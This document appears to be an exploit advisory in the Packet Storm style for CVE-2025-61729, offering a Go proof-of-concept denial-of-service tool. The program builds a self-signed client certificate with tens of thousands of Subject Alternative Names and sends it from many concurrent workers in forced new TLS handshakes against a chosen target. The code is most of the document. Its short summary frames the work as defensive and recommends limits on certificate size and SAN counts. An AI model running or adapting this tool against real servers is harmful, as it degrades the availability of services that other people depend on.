@@ -1,0 +1,277 @@
+=============================================================================================================================================
+| # Title     : crypto/x509 Go-Based TLS Certificate Parsing Stress Scenario Targeting                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.redhat.com/                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215073/  & CVE-2025-61729
+
+[+] Summary    : This Go program demonstrates a theoretical denial-of-service risk associated with handling unusually large X.509 certificates in TLS connections. 
+                 It programmatically generates a self-signed certificate containing a very large number of Subject Alternative Names (SANs) and configures an HTTP client to present this certificate during TLS handshakes. 
+                 Multiple concurrent workers then issue HTTPS requests to a specified target, aiming to stress the certificate parsing and validation logic in the crypto/x509 library.
+                 From a defensive security perspective, the code illustrates how excessive SAN entries can increase CPU and memory consumption during certificate processing, 
+				 potentially degrading service availability if not properly mitigated. The scenario highlights the importance of implementing limits on certificate size and SAN counts, 
+				 enforcing strict TLS validation policies, and applying resource controls in servers and proxies that terminate TLS.
+  
+[+] POC :   
+
+package main
+
+import (
+    "crypto/rand"
+    "crypto/rsa"
+    "crypto/tls"
+    "crypto/x509"
+    "crypto/x509/pkix"
+    "encoding/pem"
+    "flag"
+    "fmt"
+    "math/big"
+    "net/http"
+    "os"
+    "sync"
+    "time"
+)
+
+type AttackConfig struct {
+    TargetURL    string
+    NumHosts     int
+    NumWorkers   int
+    NumRequests  int
+    DelayMs      int
+    OutputCert   string
+    OutputKey    string
+    TimeoutSec   int
+    UseProxy     bool
+    ProxyURL     string
+    Verbose      bool
+}
+
+var config AttackConfig
+
+func init() {
+    flag.StringVar(&config.TargetURL, "target", "https://localhost:8443/", "Target URL")
+    flag.IntVar(&config.NumHosts, "hosts", 50000, "Number of SANs in the malicious certificate")
+    flag.IntVar(&config.NumWorkers, "workers", 50, "Number of concurrent workers")
+    flag.IntVar(&config.NumRequests, "requests", 1000, "Total number of requests")
+    flag.IntVar(&config.DelayMs, "delay", 10, "Delay between requests (ms)")
+    flag.StringVar(&config.OutputCert, "cert", "dos.crt", "Path to save the certificate")
+    flag.StringVar(&config.OutputKey, "key", "dos.key", "Path to save the private key")
+    flag.IntVar(&config.TimeoutSec, "timeout", 30, "Connection timeout (seconds)")
+    flag.BoolVar(&config.UseProxy, "proxy", false, "Use proxy")
+    flag.StringVar(&config.ProxyURL, "proxy-url", "http://127.0.0.1:8080", "Proxy URL")
+    flag.BoolVar(&config.Verbose, "verbose", false, "Enable verbose output")
+    flag.Parse()
+}
+
+func generateMaliciousCertificate() error {
+    if config.Verbose {
+        fmt.Printf("[+] Generating certificate with %d DNS names...\n", config.NumHosts)
+    }
+
+    privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
+    if err != nil {
+        return fmt.Errorf("failed to generate key: %v", err)
+    }
+
+    template := x509.Certificate{
+        SerialNumber: big.NewInt(time.Now().UnixNano()),
+        Subject: pkix.Name{
+            Country:            []string{"XX"},
+            Organization:       []string{"Security Test Corp"},
+            OrganizationalUnit: []string{"Penetration Testing"},
+            Locality:           []string{"Test City"},
+            Province:           []string{"Test Province"},
+            CommonName:         "*.test.dos",
+        },
+        NotBefore:     time.Now(),
+        NotAfter:      time.Now().Add(24 * time.Hour),
+        KeyUsage:      x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+        ExtKeyUsage:   []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
+        SubjectKeyId: []byte{1, 2, 3, 4, 5},
+    }
+
+    dnsNames := make([]string, config.NumHosts)
+    for i := 0; i < config.NumHosts; i++ {
+        dnsNames[i] = fmt.Sprintf("host-%08d.dos.test", i)
+    }
+    template.DNSNames = dnsNames
+
+    certBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
+    if err != nil {
+        return fmt.Errorf("failed to create certificate: %v", err)
+    }
+
+    certFile, err := os.Create(config.OutputCert)
+    if err != nil {
+        return fmt.Errorf("failed to save certificate: %v", err)
+    }
+    defer certFile.Close()
+    pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
+
+    keyFile, err := os.Create(config.OutputKey)
+    if err != nil {
+        return fmt.Errorf("failed to save key: %v", err)
+    }
+    defer keyFile.Close()
+    pem.Encode(keyFile, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})
+
+    if config.Verbose {
+        fmt.Printf("Certificate created: %s\n", config.OutputCert)
+        fmt.Printf("Private key created: %s\n", config.OutputKey)
+    }
+
+    return nil
+}
+
+func createHTTPClient() (*http.Client, error) {
+    cert, err := tls.LoadX509KeyPair(config.OutputCert, config.OutputKey)
+    if err != nil {
+        return nil, fmt.Errorf("failed to load key pair: %v", err)
+    }
+
+    tlsConfig := &tls.Config{
+        Certificates:       []tls.Certificate{cert},
+        InsecureSkipVerify: true, // Ignore server certificate validation
+        Renegotiation:      tls.RenegotiateOnceAsClient,
+    }
+
+    transport := &http.Transport{
+        TLSClientConfig:    tlsConfig,
+        DisableCompression: true,
+        DisableKeepAlives:  true, // Prevent connection reuse to force handshake
+        MaxIdleConns:       0,
+        MaxIdleConnsPerHost: 0,
+    }
+
+    return &http.Client{
+        Transport: transport,
+        Timeout:   time.Duration(config.TimeoutSec) * time.Second,
+    }, nil
+}
+
+func worker(id int, client *http.Client, requests <-chan int, results chan<- string, wg *sync.WaitGroup) {
+    defer wg.Done()
+
+    for reqNum := range requests {
+        startTime := time.Now()
+
+        req, err := http.NewRequest("GET", config.TargetURL, nil)
+        if err != nil {
+            results <- fmt.Sprintf("[Worker %d - Req %d] Request creation failed: %v", id, reqNum, err)
+            continue
+        }
+
+        req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
+        req.Header.Set("Accept", "*/*")
+        req.Header.Set("Connection", "close")
+        resp, err := client.Do(req)
+        duration := time.Since(startTime)
+
+        if err != nil {
+            results <- fmt.Sprintf("[Worker %d - Req %d] Failed (%v): %v", id, reqNum, duration, err)
+        } else {
+            status := resp.StatusCode
+            resp.Body.Close()
+            results <- fmt.Sprintf("[Worker %d - Req %d] Success (%v): Status %d", id, reqNum, duration, status)
+        }
+
+        if config.DelayMs > 0 {
+            time.Sleep(time.Duration(config.DelayMs) * time.Millisecond)
+        }
+    }
+}
+
+func launchAttack() error {
+    if config.Verbose {
+        fmt.Println("[+] Launching activity...")
+        fmt.Printf("    Target: %s\n", config.TargetURL)
+        fmt.Printf("    Workers: %d\n", config.NumWorkers)
+        fmt.Printf("    Requests: %d\n", config.NumRequests)
+    }
+
+    requests := make(chan int, config.NumRequests)
+    results := make(chan string, config.NumRequests)
+
+    client, err := createHTTPClient()
+    if err != nil {
+        return err
+    }
+
+    var wg sync.WaitGroup
+    for i := 0; i < config.NumWorkers; i++ {
+        wg.Add(1)
+        go worker(i, client, requests, results, &wg)
+    }
+
+    go func() {
+        for i := 0; i < config.NumRequests; i++ {
+            requests <- i
+        }
+        close(requests)
+    }()
+
+    go func() {
+        wg.Wait()
+        close(results)
+    }()
+
+    successCount := 0
+    failCount := 0
+
+    for result := range results {
+        if config.Verbose {
+            fmt.Println(result)
+        }
+        failCount++ 
+    }
+
+    fmt.Printf("\n[✓] Execution completed\n")
+    fmt.Printf("    Failed/Processed requests: %d\n", failCount)
+
+    return nil
+}
+
+func banner() {
+    fmt.Println(`
+╔═════════════════════════════════════════════════════╗
+║   CVE-2025-61729 Exploit - Denial of Service        ║
+║   Golang crypto/x509 Vulnerability Test             ║
+╚═════════════════════════════════════════════════════╝
+`)
+}
+
+func main() {
+    banner()
+
+    if os.Geteuid() == 0 {
+        fmt.Println("[!] Running as root - Proceed with caution!")
+    }
+
+    if config.NumHosts <= 0 {
+        fmt.Println("[!] Host count must be greater than zero")
+        os.Exit(1)
+    }
+
+    if err := generateMaliciousCertificate(); err != nil {
+        fmt.Printf("[!] Certificate generation failed: %v\n", err)
+        os.Exit(1)
+    }
+
+    if err := launchAttack(); err != nil {
+        fmt.Printf("[!] Execution failed: %v\n", err)
+        os.Exit(1)
+    }
+
+    if config.Verbose {
+        fmt.Println("\n[+] Cleaning up temporary files...")
+        os.Remove(config.OutputCert)
+        os.Remove(config.OutputKey)
+    }
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
